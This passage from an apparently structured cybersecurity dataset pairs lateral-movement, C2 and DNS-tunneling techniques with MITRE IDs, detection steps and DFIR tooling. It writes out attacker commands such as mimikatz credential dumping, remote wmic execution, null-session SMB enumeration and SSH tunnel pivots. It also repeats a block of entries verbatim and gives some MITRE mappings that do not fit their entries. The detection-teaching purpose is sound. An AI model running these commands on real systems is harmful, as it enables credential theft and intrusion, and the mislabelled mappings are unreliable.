- **Attack Steps**: 1. Set up Zeek and configure it to log connection data (conn.log). 2. Deploy malware (or simulate C2) that beacons every 30 seconds to a remote IP. 3. Use conn.log to extract communication frequency, duration, and interval. 4. Run RITA on Zeek logs to detect periodic communication patterns. 5. Identify small, repetitive connections with low data volume (typical of beaconing). 6. Use Zeek’s notice.log and weird.log for further anomalies. 7. Validate findings with known C2 IP lists or domain reputation tools. 8. Pivot to host artifacts if beaconing confirmed.
- **Detection**: Beacon interval analysis, Zeek + RITA alerting
- **Solution**: Use beacon detection frameworks, restrict external connections, proxy inspection
- **Tags**: C2, beaconing, periodic traffic, RITA, Zeek

## Tracing RDP Lateral Movement via Event Logs

- **Attack Type**: RDP-Based Lateral Movement
- **Target**: Windows Hosts
- **Vulnerability**: Weak password policy and RDP enabled
- **MITRE**: T1021.001
- **Impact**: Attacker gains GUI access to multiple systems
- **Tools**: Windows Event Viewer, Event IDs 4624, 4648
- **Scenario**: Lateral movement is performed using Remote Desktop Protocol between internal systems
- **Attack Steps**: 1. Simulate RDP session from attacker host to victim using MSTSC. 2. On the target, gather Security Event Logs (eventvwr.msc). 3. Focus on Event ID 4624 (Logon) with Logon Type 10 (RDP). 4. Also check Event ID 4648 (Explicit credentials) for possible credential use. 5. Correlate login timestamps and source IPs to determine origin system. 6. Use PowerShell to extract relevant event logs or KAPE. 7. Map login trail between systems to build attacker movement path. 8. If 4625 (logon failures) are found, this could indicate brute force attempts.
- **Detection**: RDP logon event correlation, source IP traceback
- **Solution**: Disable RDP if unnecessary, enforce MFA, log and monitor RDP sessions
- **Tags**: RDP, Windows Events, login traceability, brute force

## Detecting SMB Relay Attacks Using Proxy Logs

- **Attack Type**: SMB Relay Attack
- **Target**: Internal Network
- **Vulnerability**: NTLM without SMB signing or message integrity enabled
- **MITRE**: T1557.001
- **Impact**: Unauthorized access to internal systems
- **Tools**: Burp Suite, Squid Proxy Logs, Responder
- **Scenario**: An attacker relays NTLM authentication to another host to authenticate without knowing credentials
- **Attack Steps**: 1. Attacker sets up Responder or NTLMRelayx to intercept and relay NTLM requests. 2. Trick user into accessing attacker-controlled share via phishing or UNC path. 3. Proxy captures outgoing NTLM auth request. 4. Replay the request to target server with SMB. 5. Monitor Squid or internal proxy logs for abnormal SMB-related NTLM traffic. 6. Analyze request patterns that don’t align with normal browsing behavior. 7. Check for authentication success logs without interactive logon. 8. Correlate source machine and target IP to identify the relay path.
- **Detection**: Proxy log analysis, unusual SMB over proxy traffic
- **Solution**: Enforce SMB signing, disable NTLM, monitor for SMB relays
- **Tags**: SMB, NTLM relay, Responder, authentication anomalies

## Correlating Zeek HTTP Logs with Web Shell Activity

- **Attack Type**: Web Shell Communication
- **Target**: Web Server
- **Vulnerability**: Upload vulnerability or RCE used to plant shell
- **MITRE**: T1505.003
- **Impact**: Full attacker control via HTTP shell interface
- **Tools**: Zeek HTTP Logs, Apache Access Logs
- **Scenario**: Attacker installs a web shell and interacts over HTTP/S, avoiding traditional C2 channels
- **Attack Steps**: 1. Deploy a web shell like China Chopper on a web server. 2. Use browser or curl to send commands to shell via POST requests. 3. Zeek captures HTTP traffic in http.log. 4. Analyze POST frequency, URI patterns, and User-Agent strings. 5. Look for traffic from non-standard external IPs or user-agents (e.g., no browser fingerprint). 6. Cross-reference with Apache logs for time, IP, and URI match. 7. Use file hashes of known web shells to confirm existence. 8. Block IP or isolate server upon confirmation.
- **Detection**: Zeek + server log correlation, behavioral anomaly
- **Solution**: WAF implementation, alert on suspicious HTTP methods, web server hardening
- **Tags**: web shell, HTTP POST, Zeek, Apache, lateral control

## Detecting SMB Enumeration Before Lateral Movement

- **Attack Type**: Reconnaissance
- **Target**: Internal Network
- **Vulnerability**: Unrestricted share enumeration, anonymous access
- **MITRE**: T1135
- **Impact**: Prepares ground for lateral file transfers or exec
- **Tools**: SMBClient, Zeek SMB logs, Wireshark
- **Scenario**: Attacker enumerates shared resources via SMB to plan lateral movement
- **Attack Steps**: 1. Use smbclient -L //<target> from attacker host to list available shares. 2. Capture this traffic using Zeek’s smb_files.log or Wireshark. 3. Review log entries showing share names like ADMIN$, C$, IPC$. 4. Look for multiple enumeration attempts within short intervals. 5. Correlate with login attempts or failed logons. 6. Check if unusual users are performing enumeration. 7. Use alert rules to flag excessive access to IPC or admin shares. 8. Combine with endpoint logs to see if file transfers followed.
- **Detection**: Zeek SMB logs, excessive enumeration alerts
- **Solution**: Restrict SMB share access, log and alert on enumeration behavior
- **Tags**: SMB, reconnaissance, Zeek, share enumeration

## Tracing Lateral Movement via WMI Commands

- **Attack Type**: WMI-Based Lateral Movement
- **Target**: Windows Hosts
- **Vulnerability**: Remote WMI not blocked or monitored
- **MITRE**: T1047
- **Impact**: Remote code execution without file artifacts
- **Tools**: Windows Logs, Sysmon, WMI Explorer
- **Scenario**: Attacker uses WMI to execute commands remotely without file drops
- **Attack Steps**: 1. Execute wmic /node:"target" process call create "cmd.exe" from attacker host. 2. On target, enable and collect Windows Event Logs and Sysmon data. 3. Look for Event ID 4688 (process creation) linked to WMI. 4. Check for parent-child process relationships with WmiPrvSE.exe. 5. Cross-reference with Event ID 5861 (WMI activity). 6. Search for command line usage consistent with remote code execution. 7. Build a timeline from source system to target execution. 8. Confirm whether WMI calls were authorized and logged.
- **Detection**: Sysmon process tracing, WMI log inspection
- **Solution**: Restrict remote WMI, enforce logging, monitor high-integrity process spawning
- **Tags**: WMI, lateral movement, Sysmon, remote command

## Correlating Proxy Logs with C2 Channels Over HTTPS

- **Attack Type**: C2 Over HTTPS
- **Target**: Enterprise LAN
- **Vulnerability**: C2 over encrypted channels bypassing inspection
- **MITRE**: T1071.001
- **Impact**: Persistent remote access via encrypted traffic
- **Tools**: Proxy Logs, SSL Inspection, Bro/Zeek
- **Scenario**: Malware communicates with remote C2 using HTTPS to evade detection
- **Attack Steps**: 1. Simulate HTTPS-based malware beacon using tools like Cobalt Strike. 2. Ensure proxy logging and SSL inspection are enabled. 3. Review proxy logs for small, periodic HTTPS POSTs to suspicious domains. 4. Correlate with Zeek’s ssl.log for certificate anomalies. 5. Validate hostnames against threat intel or expired certs. 6. Compare time intervals and source IPs across connections. 7. Alert on unknown self-signed certs or dynamic DNS usage. 8. Isolate suspected systems and retrieve memory/network logs.
- **Detection**: SSL/TLS inspection, domain reputation, session timing analysis
- **Solution**: Deep packet inspection, SSL decryption, block known bad cert issuers
- **Tags**: HTTPS, C2, proxy logs, encrypted channel

## Identifying DNS Rebinding Attacks Using Zeek

- **Attack Type**: DNS Rebinding
- **Target**: Web Clients
- **Vulnerability**: Lack of DNS pinning, browser allows rebinding
- **MITRE**: T1565.001
- **Impact**: Internal service exposure via browser
- **Tools**: Zeek, Burp Suite, Browser Dev Tools
- **Scenario**: Attacker bypasses internal firewall to access internal services via browser exploiting DNS caching
- **Attack Steps**: 1. Attacker hosts malicious page that issues JavaScript-based DNS rebinding. 2. Victim browser connects to attacker domain resolving to attack server. 3. DNS entry TTL expires quickly, domain rebinds to internal IP (e.g., 192.168.x.x). 4. JavaScript re-issues request, now targeting internal resource. 5. Zeek logs reveal changing A-records in dns.log. 6. Look for same domain resolving to external then internal IPs. 7. Correlate with HTTP logs for browser activity. 8. Alert on mismatched DNS resolution patterns. 9. Block offending domain or isolate affected host.
- **Detection**: Zeek DNS + HTTP logs correlation, TTL anomaly detection
- **Solution**: DNS pinning enforcement, deny rebinding in browsers via CSP
- **Tags**: DNS, browser, rebinding, Zeek, JavaScript attack

## Detecting Exfiltration via DNS Tunneling using Zeek

- **Attack Type**: DNS Tunneling
- **Target**: Enterprise LAN
- **Vulnerability**: Open egress on DNS port to untrusted domains
- **MITRE**: T1048.003
- **Impact**: Data exfiltration without triggering traditional alerts
- **Tools**: Zeek, tshark, dnscat2
- **Scenario**: An attacker uses DNS tunneling to exfiltrate stolen data by encoding it in DNS queries to a rogue server
- **Attack Steps**: 1. Set up a Zeek sensor on the network to capture DNS traffic. 2. Start a DNS exfiltration tool like dnscat2 on the attacker side. 3. Encode files or commands into DNS query packets (e.g., base64 into subdomain). 4. Zeek will log unusual query lengths, patterns, and frequency in dns.log. 5. Use Zeek scripts or zeek-cut to analyze domain entropy, frequency, and data volume. 6. Correlate suspected queries with internal hosts and session times. 7. Use threat intel feeds to check suspicious domains. 8. Export full PCAPs for deeper inspection using Wireshark.
- **Detection**: DNS entropy analysis, Zeek scripting, anomaly detection
- **Solution**: Block unauthorized DNS traffic, use internal DNS resolvers, inspect DNS payloads
- **Tags**: DNS, exfiltration, Zeek, anomaly detection

## Mapping PsExec-Based Lateral Movement with Firewall Logs

- **Attack Type**: Lateral Movement via SMB
- **Target**: Windows Hosts
- **Vulnerability**: Over-permissive admin share access and SMB exposure
- **MITRE**: T1021.002
- **Impact**: Compromise of additional internal systems
- **Tools**: Windows Firewall Logs, KAPE, Splunk
- **Scenario**: Attacker uses PsExec to move laterally using administrative shares across hosts
- **Attack Steps**: 1. Simulate PsExec movement by running PsExec.exe \\target cmd.exe from attacker host. 2. Enable firewall logging on target systems (netsh advfirewall). 3. Extract logs with KAPE or manually pull from %systemroot%\system32\LogFiles\Firewall. 4. Parse logs for connection attempts on TCP port 445 (SMB) from source host. 5. Cross-reference time and source IP with login attempts in security logs. 6. Use timeline tools to build a sequence of lateral movement. 7. Look for patterns across multiple endpoints indicating propagation behavior.
- **Detection**: SMB connection tracking, Windows event correlation
- **Solution**: Harden admin shares, restrict SMB, use PsExec detection signatures
- **Tags**: PsExec, SMB, Windows Firewall Logs, lateral movement

## Beaconing Detection via Zeek’s Conn and Notice Logs

- **Attack Type**: C2 Beaconing
- **Target**: Enterprise LAN
- **Vulnerability**: Firewall allows outbound to unmonitored remote IPs
- **MITRE**: T1071.001
- **Impact**: Establishment of persistent remote access channels
- **Tools**: Zeek, ELK Stack, RITA
- **Scenario**: Attacker implants malware that connects to a C2 server at regular intervals
- **Attack Steps**: 1. Set up Zeek and configure it to log connection data (conn.log). 2. Deploy malware (or simulate C2) that beacons every 30 seconds to a remote IP. 3. Use conn.log to extract communication frequency, duration, and interval. 4. Run RITA on Zeek logs to detect periodic communication patterns. 5. Identify small, repetitive connections with low data volume (typical of beaconing). 6. Use Zeek’s notice.log and weird.log for further anomalies. 7. Validate findings with known C2 IP lists or domain reputation tools. 8. Pivot to host artifacts if beaconing confirmed.
- **Detection**: Beacon interval analysis, Zeek + RITA alerting
- **Solution**: Use beacon detection frameworks, restrict external connections, proxy inspection
- **Tags**: C2, beaconing, periodic traffic, RITA, Zeek

## Tracing RDP Lateral Movement via Event Logs

- **Attack Type**: RDP-Based Lateral Movement
- **Target**: Windows Hosts
- **Vulnerability**: Weak password policy and RDP enabled
- **MITRE**: T1021.001
- **Impact**: Attacker gains GUI access to multiple systems
- **Tools**: Windows Event Viewer, Event IDs 4624, 4648
- **Scenario**: Lateral movement is performed using Remote Desktop Protocol between internal systems
- **Attack Steps**: 1. Simulate RDP session from attacker host to victim using MSTSC. 2. On the target, gather Security Event Logs (eventvwr.msc). 3. Focus on Event ID 4624 (Logon) with Logon Type 10 (RDP). 4. Also check Event ID 4648 (Explicit credentials) for possible credential use. 5. Correlate login timestamps and source IPs to determine origin system. 6. Use PowerShell to extract relevant event logs or KAPE. 7. Map login trail between systems to build attacker movement path. 8. If 4625 (logon failures) are found, this could indicate brute force attempts.
- **Detection**: RDP logon event correlation, source IP traceback
- **Solution**: Disable RDP if unnecessary, enforce MFA, log and monitor RDP sessions
- **Tags**: RDP, Windows Events, login traceability, brute force

## Detecting SMB Relay Attacks Using Proxy Logs

- **Attack Type**: SMB Relay Attack
- **Target**: Internal Network
- **Vulnerability**: NTLM without SMB signing or message integrity enabled
- **MITRE**: T1557.001
- **Impact**: Unauthorized access to internal systems
- **Tools**: Burp Suite, Squid Proxy Logs, Responder
- **Scenario**: An attacker relays NTLM authentication to another host to authenticate without knowing credentials
- **Attack Steps**: 1. Attacker sets up Responder or NTLMRelayx to intercept and relay NTLM requests. 2. Trick user into accessing attacker-controlled share via phishing or UNC path. 3. Proxy captures outgoing NTLM auth request. 4. Replay the request to target server with SMB. 5. Monitor Squid or internal proxy logs for abnormal SMB-related NTLM traffic. 6. Analyze request patterns that don’t align with normal browsing behavior. 7. Check for authentication success logs without interactive logon. 8. Correlate source machine and target IP to identify the relay path.
- **Detection**: Proxy log analysis, unusual SMB over proxy traffic
- **Solution**: Enforce SMB signing, disable NTLM, monitor for SMB relays
- **Tags**: SMB, NTLM relay, Responder, authentication anomalies

## Correlating Zeek HTTP Logs with Web Shell Activity

- **Attack Type**: Web Shell Communication
- **Target**: Web Server
- **Vulnerability**: Upload vulnerability or RCE used to plant shell
- **MITRE**: T1505.003
- **Impact**: Full attacker control via HTTP shell interface
- **Tools**: Zeek HTTP Logs, Apache Access Logs
- **Scenario**: Attacker installs a web shell and interacts over HTTP/S, avoiding traditional C2 channels
- **Attack Steps**: 1. Deploy a web shell like China Chopper on a web server. 2. Use browser or curl to send commands to shell via POST requests. 3. Zeek captures HTTP traffic in http.log. 4. Analyze POST frequency, URI patterns, and User-Agent strings. 5. Look for traffic from non-standard external IPs or user-agents (e.g., no browser fingerprint). 6. Cross-reference with Apache logs for time, IP, and URI match. 7. Use file hashes of known web shells to confirm existence. 8. Block IP or isolate server upon confirmation.
- **Detection**: Zeek + server log correlation, behavioral anomaly
- **Solution**: WAF implementation, alert on suspicious HTTP methods, web server hardening
- **Tags**: web shell, HTTP POST, Zeek, Apache, lateral control

## Detecting SMB Enumeration Before Lateral Movement

- **Attack Type**: Reconnaissance
- **Target**: Internal Network
- **Vulnerability**: Unrestricted share enumeration, anonymous access
- **MITRE**: T1135
- **Impact**: Prepares ground for lateral file transfers or exec
- **Tools**: SMBClient, Zeek SMB logs, Wireshark
- **Scenario**: Attacker enumerates shared resources via SMB to plan lateral movement
- **Attack Steps**: 1. Use smbclient -L //<target> from attacker host to list available shares. 2. Capture this traffic using Zeek’s smb_files.log or Wireshark. 3. Review log entries showing share names like ADMIN$, C$, IPC$. 4. Look for multiple enumeration attempts within short intervals. 5. Correlate with login attempts or failed logons. 6. Check if unusual users are performing enumeration. 7. Use alert rules to flag excessive access to IPC or admin shares. 8. Combine with endpoint logs to see if file transfers followed.
- **Detection**: Zeek SMB logs, excessive enumeration alerts
- **Solution**: Restrict SMB share access, log and alert on enumeration behavior
- **Tags**: SMB, reconnaissance, Zeek, share enumeration

## Tracing Lateral Movement via WMI Commands

- **Attack Type**: WMI-Based Lateral Movement
- **Target**: Windows Hosts
- **Vulnerability**: Remote WMI not blocked or monitored
- **MITRE**: T1047
- **Impact**: Remote code execution without file artifacts
- **Tools**: Windows Logs, Sysmon, WMI Explorer
- **Scenario**: Attacker uses WMI to execute commands remotely without file drops
- **Attack Steps**: 1. Execute wmic /node:"target" process call create "cmd.exe" from attacker host. 2. On target, enable and collect Windows Event Logs and Sysmon data. 3. Look for Event ID 4688 (process creation) linked to WMI. 4. Check for parent-child process relationships with WmiPrvSE.exe. 5. Cross-reference with Event ID 5861 (WMI activity). 6. Search for command line usage consistent with remote code execution. 7. Build a timeline from source system to target execution. 8. Confirm whether WMI calls were authorized and logged.
- **Detection**: Sysmon process tracing, WMI log inspection
- **Solution**: Restrict remote WMI, enforce logging, monitor high-integrity process spawning
- **Tags**: WMI, lateral movement, Sysmon, remote command

## Correlating Proxy Logs with C2 Channels Over HTTPS

- **Attack Type**: C2 Over HTTPS
- **Target**: Enterprise LAN
- **Vulnerability**: C2 over encrypted channels bypassing inspection
- **MITRE**: T1071.001
- **Impact**: Persistent remote access via encrypted traffic
- **Tools**: Proxy Logs, SSL Inspection, Bro/Zeek
- **Scenario**: Malware communicates with remote C2 using HTTPS to evade detection
- **Attack Steps**: 1. Simulate HTTPS-based malware beacon using tools like Cobalt Strike. 2. Ensure proxy logging and SSL inspection are enabled. 3. Review proxy logs for small, periodic HTTPS POSTs to suspicious domains. 4. Correlate with Zeek’s ssl.log for certificate anomalies. 5. Validate hostnames against threat intel or expired certs. 6. Compare time intervals and source IPs across connections. 7. Alert on unknown self-signed certs or dynamic DNS usage. 8. Isolate suspected systems and retrieve memory/network logs.
- **Detection**: SSL/TLS inspection, domain reputation, session timing analysis
- **Solution**: Deep packet inspection, SSL decryption, block known bad cert issuers
- **Tags**: HTTPS, C2, proxy logs, encrypted channel

## Identifying DNS Rebinding Attacks Using Zeek

- **Attack Type**: DNS Rebinding
- **Target**: Web Clients
- **Vulnerability**: Lack of DNS pinning, browser allows rebinding
- **MITRE**: T1565.001
- **Impact**: Internal service exposure via browser
- **Tools**: Zeek, Burp Suite, Browser Dev Tools
- **Scenario**: Attacker bypasses internal firewall to access internal services via browser exploiting DNS caching
- **Attack Steps**: 1. Attacker hosts malicious page that issues JavaScript-based DNS rebinding. 2. Victim browser connects to attacker domain resolving to attack server. 3. DNS entry TTL expires quickly, domain rebinds to internal IP (e.g., 192.168.x.x). 4. JavaScript re-issues request, now targeting internal resource. 5. Zeek logs reveal changing A-records in dns.log. 6. Look for same domain resolving to external then internal IPs. 7. Correlate with HTTP logs for browser activity. 8. Alert on mismatched DNS resolution patterns. 9. Block offending domain or isolate affected host.
- **Detection**: Zeek DNS + HTTP logs correlation, TTL anomaly detection
- **Solution**: DNS pinning enforcement, deny rebinding in browsers via CSP
- **Tags**: DNS, browser, rebinding, Zeek, JavaScript attack

## SMB Enumeration via Null Session

- **Attack Type**: Lateral Movement Tracing
- **Target**: Windows Server
- **Vulnerability**: Misconfigured SMB allowing anonymous logins
- **MITRE**: T1135 – Network Share Discovery
- **Impact**: Internal recon for lateral movement
- **Tools**: smbclient, enum4linux, CrackMapExec
- **Scenario**: Adversary uses null sessions to enumerate shares and user accounts for movement planning
- **Attack Steps**: 1. The attacker uses smbclient -L //target-ip/ -N to list available shares. 2. They utilize enum4linux to enumerate users, groups, and password policies via null sessions. 3. CrackMapExec is used to validate any accessible shares. 4. Adversary collects usernames and builds a target list for brute force or ticket attacks.
- **Detection**: Network monitoring for anonymous SMB connections
- **Solution**: Disable null sessions and enforce SMB signing
- **Tags**: smb, enumeration, recon, lateral movement

## Lateral Movement through RDP Credential Replay

- **Attack Type**: Lateral Movement
- **Target**: Windows Workstation
- **Vulnerability**: Reused passwords and open RDP
- **MITRE**: T1021.001 – Remote Services
- **Impact**: Adversary gains control of more systems
- **Tools**: Mimikatz, RDP client
- **Scenario**: Stolen credentials from one host used for RDP access to move laterally
- **Attack Steps**: 1. Attacker extracts user credentials using mimikatz sekurlsa::logonpasswords. 2. Validates credentials using RDP from a compromised machine. 3. Connects using mstsc or scripted RDP tools. 4. Once inside the new machine, privilege escalation is performed. 5. Files, credentials, and access tokens are extracted for deeper access.
- **Detection**: Log correlation of RDP sessions across hosts
- **Solution**: Enforce MFA, restrict RDP via network rules
- **Tags**: rdp, credentials, replay, lateral movement

## Mapping Active Directory Trusts for Cross-Domain Movement

- **Attack Type**: Lateral Movement Tracing
- **Target**: Active Directory
- **Vulnerability**: Poorly monitored trust relationships
- **MITRE**: T1482 – Domain Trust Discovery
- **Impact**: Enables movement beyond initial domain scope
- **Tools**: BloodHound, ADExplorer
- **Scenario**: Adversary maps domain trusts to plan cross-domain lateral movement
- **Attack Steps**: 1. Adversary runs BloodHound collectors to gather trust relationships. 2. AD data is fed into BloodHound for pathfinding across domains. 3. Trust paths are used to identify high-value accounts or jump servers. 4. Tokens or credentials are relayed between domains. 5. Access is used to pivot deeper into the environment.
- **Detection**: Monitor inter-domain authentications
- **Solution**: Harden trust policies, apply selective trust
- **Tags**: AD, trust, cross-domain, lateral

## Detecting PsExec Artifact Trail from Attackers

- **Attack Type**: Lateral Movement Detection
- **Target**: Windows Server
- **Vulnerability**: Misuse of administrative remote tools
- **MITRE**: T1569.002 – Service Execution
- **Impact**: Unauthorized command execution across systems
- **Tools**: Sysmon, ELK, KAPE
- **Scenario**: Blue team traces attacker use of PsExec to move across machines
- **Attack Steps**: 1. Investigator uses Sysmon Event ID 1 (process creation) to detect psexecsvc.exe. 2. Cross-reference with Event ID 7045 (service creation) for PsExec activity. 3. Use KAPE with targets MiniTriage and RegistryHives to recover logs and artifacts. 4. Logs loaded into ELK stack to map lateral movement timeline.
- **Detection**: Event log + Sysmon correlation
- **Solution**: Block PsExec via AppLocker/SRP
- **Tags**: psexec, detection, event logs, DFIR

## Suspicious Lateral Movement via Remote WMI Invocation

- **Attack Type**: Command Execution & Tracing
- **Target**: Windows Host
- **Vulnerability**: Remote WMI access allowed without restriction
- **MITRE**: T1047 – Windows Management Instrumentation
- **Impact**: Hidden code execution across machines
- **Tools**: WMI, PowerShell, Sysmon
- **Scenario**: Lateral movement using Windows Management Instrumentation (WMI)
- **Attack Steps**: 1. Attacker uses wmic /node:hostname process call create "cmd.exe" to remotely spawn processes. 2. Commands are silently executed on the target. 3. Sysmon Event ID 1 and ID 3 are monitored to detect process and network activity. 4. Blue team extracts WMI logs from Event Viewer (Microsoft-Windows-WMI-Activity). 5. Correlates timestamp and initiator IP.
- **Detection**: Log WMI provider host activity & process telemetry
- **Solution**: Harden WMI permissions, enable command logging
- **Tags**: wmi, remote execution, dfir, trace

## Lateral Movement via Scheduled Tasks

- **Attack Type**: Lateral Movement
- **Target**: Windows Systems
- **Vulnerability**: Misuse of legitimate scheduling mechanism
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: Persistence and delayed lateral execution
- **Tools**: schtasks, PowerShell, Event Logs
- **Scenario**: Attacker uses scheduled tasks to maintain persistence and move across systems
- **Attack Steps**: 1. Attacker creates a scheduled task using schtasks /create on a remote system. 2. Task runs malicious payload at set time or on trigger. 3. Blue team detects via Event ID 4698 (task creation) and ID 4702 (task modification). 4. Registry keys under HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree examined for entries.
- **Detection**: Audit task creation/modification logs
- **Solution**: Disable remote task creation, enable audit policies
- **Tags**: scheduled task, persistence, lateral movement

## Investigating Lateral Spread via SMB Drive Mapping

- **Attack Type**: File Share Tracing
- **Target**: Windows Server
- **Vulnerability**: Unrestricted SMB shares
- **MITRE**: T1021.002 – SMB/Windows Admin Shares
- **Impact**: Data exfiltration or code execution through mapped drives
- **Tools**: net use, File Explorer logs, Prefetch
- **Scenario**: Adversary uses mapped drives over SMB to move files or execute payloads
- **Attack Steps**: 1. net use commands executed to map drives like net use Z: \\host\share. 2. Attacker transfers tools, payloads, or scripts. 3. Prefetch files such as explorer.exe and custom tools analyzed. 4. Windows Event ID 5140 (shared object access) and 5156 (network connection) used to trace usage.
- **Detection**: Log and alert on unusual SMB shares
- **Solution**: Restrict open shares, monitor access patterns
- **Tags**: smb, drive mapping, dfir, tracing

## Fileless Lateral Movement Using PowerShell Remoting

- **Attack Type**: Lateral Movement
- **Target**: Windows Systems
- **Vulnerability**: WinRM enabled with lax authentication
- **MITRE**: T1021.006 – PowerShell Remoting
- **Impact**: Fileless code execution across network
- **Tools**: PowerShell, WinRM, Event Logs
- **Scenario**: Adversary avoids dropping files by using PowerShell Remoting to execute commands
- **Attack Steps**: 1. PowerShell command like Invoke-Command -ComputerName victim -ScriptBlock {payload} used. 2. Runs entirely in memory, bypassing disk-based detection. 3. Blue team enables WinRM logs and PowerShell transcription logging. 4. Event ID 4104 (PowerShell script block logging) and 4688 (process creation) analyzed for activity.
- **Detection**: Script block logging and WinRM session monitoring
- **Solution**: Restrict WinRM, enforce remote PowerShell policies
- **Tags**: powershell, fileless, remoting, lateral movement

## DNS Tunneling for Command & Control

- **Attack Type**: Network Tracing
- **Target**: Internal Network
- **Vulnerability**: DNS resolution allowed without inspection
- **MITRE**: T1071.004 – Application Layer Protocol: DNS
- **Impact**: Covert communication and data leaks
- **Tools**: dnscat2, Wireshark, Zeek
- **Scenario**: DNS traffic is used as covert channel for data exfiltration or lateral communication
- **Attack Steps**: 1. Attacker configures dnscat2 server and client. 2. Commands are encoded in DNS queries like abc.command.domain.com. 3. Blue team analyzes pcap or Zeek logs to detect unusually long DNS queries. 4. Domain entropy and frequency analysis performed. 5. Detects beaconing pattern and command payloads.
- **Detection**: DNS traffic monitoring, frequency analysis
- **Solution**: Enable deep DNS inspection, block known tunneling tools
- **Tags**: dns, tunneling, C2, lateral movement

## Remote Desktop Tunneling via SSH for Internal Pivot

- **Attack Type**: Network & Lateral Movement
- **Target**: Internal Hosts
- **Vulnerability**: Allowed SSH tunneling through firewall
- **MITRE**: T1572 – Protocol Tunneling
- **Impact**: Hidden internal access path for lateral control
- **Tools**: PuTTY, SSH, RDP
- **Scenario**: Attacker uses SSH tunnels to pivot RDP sessions inside segmented networks
- **Attack Steps**: 1. Attacker sets up SSH tunnel: ssh -L 3389:internal-host:3389 user@jump-host. 2. Uses PuTTY or command line to establish the tunnel. 3. Connects to localhost:3389 to RDP into internal machine via jump box. 4. Traffic appears as local, bypassing many firewall rules. 5. Defender inspects unusual localhost connections to RDP port.
- **Detection**: Monitor RDP destination logs and SSH port usage
- **Solution**: Restrict SSH tunnels, inspect localhost-based RDP
- **Tags**: ssh tunnel, rdp, pivoting, lateral access

## Live Memory Collection Using GRR Rapid Response

- **Attack Type**: Forensic Artifact Collection
- **Target**: Workstations
- **Vulnerability**: None (Incident Response Scenario)
- **MITRE**: T1003.001
- **Impact**: Allows in-depth analysis of malware in memory
- **Tools**: GRR Rapid Response
- **Scenario**: A security team wants to remotely collect live memory from all endpoints after detecting beaconing behavior.
- **Attack Steps**: 1. Deploy the GRR client to all endpoints via GPO or automated script. 2. Launch the GRR Admin Console and identify the targeted machines. 3. Navigate to the "Memory Collection" artifact and schedule a flow. 4. Enable memory image compression and choose collection format (e.g., RAW or AFF4). 5. Execute the flow and monitor status in the server dashboard. 6. Once completed, download collected memory images. 7. Verify integrity using hashes. 8. Load into Volatility or Rekall for offline analysis.
- **Detection**: Cross-check memory images for suspicious injected code
- **Solution**: Use GRR to perform scalable memory acquisition with minimal user disruption
- **Tags**: memory-forensics, live-response, GRR, DFIR

## Targeted Registry Extraction with KAPE

- **Attack Type**: Registry Triage
- **Target**: Workstations
- **Vulnerability**: Persistence via registry abuse
- **MITRE**: T1547.001
- **Impact**: Helps identify startup items, malware autoruns
- **Tools**: KAPE
- **Scenario**: Analysts need to triage registry hives for autoruns and persistence mechanisms.
- **Attack Steps**: 1. Download and extract the KAPE toolkit. 2. Launch the gkape.exe GUI. 3. In Targets, select RegistryHives, AmCache, UserAssist, ShimCache. 4. Set the source drive (e.g., C:\) and destination folder for output. 5. Enable modules to parse the extracted hives. 6. Click "Execute" and monitor KAPE’s collection and parsing process. 7. Review outputs in KAPE_Output\Modules for parsed registry reports. 8. Cross-reference persistence entries with known attacker techniques.
- **Detection**: SIEM rules, comparison with baselines
- **Solution**: Use KAPE for fast and targeted registry triage
- **Tags**: registry, persistence, kape, triage

## Remote Prefetch Analysis with Velociraptor

- **Attack Type**: Remote Forensic Collection
- **Target**: Workstations
- **Vulnerability**: Lack of prefetch monitoring
- **MITRE**: T1005
- **Impact**: Reveals executed attacker tools and timeline
- **Tools**: Velociraptor
- **Scenario**: IR team needs to analyze program execution remotely on a suspect endpoint.
- **Attack Steps**: 1. Deploy Velociraptor server and agent infrastructure. 2. Login to Velociraptor Web UI and select the client. 3. Use the built-in artifact Windows.Prefetch to collect prefetch files. 4. Run the collection flow and wait for the data. 5. Download the prefetch files or view summaries in the UI. 6. Use built-in parsers or external tools like PECmd. 7. Identify suspicious executables and their timestamps. 8. Cross-correlate findings with EDR and timeline data.
- **Detection**: Check unusual execution patterns in prefetch
- **Solution**: Use Velociraptor to remotely triage app execution
- **Tags**: velociraptor, prefetch, remote-triage

## Fleet-Wide File Triage with GRR

- **Attack Type**: Remote Triage
- **Target**: Enterprise Endpoints
- **Vulnerability**: None (Post-Incident Collection)
- **MITRE**: T1560.001
- **Impact**: Rapid snapshot of affected files across org
- **Tools**: GRR Rapid Response
- **Scenario**: After a ransomware attack, SOC wants to collect specific file types across hundreds of systems.
- **Attack Steps**: 1. Log into GRR Admin UI. 2. Create a new hunt using the "File Finder" flow. 3. Set filename regex pattern (e.g., *.docx, *.xlsx) and root paths like C:\Users. 4. Apply to all Windows clients. 5. Launch the hunt and monitor client response status. 6. Collected files are stored in the GRR server backend. 7. Download and scan for encryption markers or ransom notes. 8. Identify files modified around the attack timestamp.
- **Detection**: Review file timestamps and extensions
- **Solution**: Use GRR's scalable hunting to collect file evidence
- **Tags**: ransomware, GRR, triage, bulk-collection

## Collecting Event Logs via KAPE

- **Attack Type**: Event Log Triage
- **Target**: Servers
- **Vulnerability**: Brute-force attempts
- **MITRE**: T1110.001
- **Impact**: Tracks failed logons and logon types
- **Tools**: KAPE
- **Scenario**: SOC needs a fast way to collect and parse Windows Event Logs for failed login attempts.
- **Attack Steps**: 1. Launch gkape.exe and choose EventLogs in the Target list. 2. Set target path to system drive (e.g., C:\) and output folder. 3. Enable modules for EVTX parsing (e.g., EVTXtract, EVTXECmd). 4. Execute KAPE and wait for completion. 5. Open parsed logs in Excel or timeline tools. 6. Filter for Event ID 4625 (failed logons). 7. Review source IPs, usernames, and timestamps. 8. Correlate with brute-force or lateral movement evidence.
- **Detection**: Alerts on repeated 4625s from same source
- **Solution**: Use KAPE to parse logs for auth failures quickly
- **Tags**: eventlogs, failedlogins, kape, brute-force

## Velociraptor Registry Monitoring for Persistence

- **Attack Type**: Live Forensics
- **Target**: Workstations
- **Vulnerability**: Registry abuse for persistence
- **MITRE**: T1547.001
- **Impact**: Detects live persistence implants
- **Tools**: Velociraptor
- **Scenario**: Threat hunters want to remotely monitor changes to known persistence registry keys.
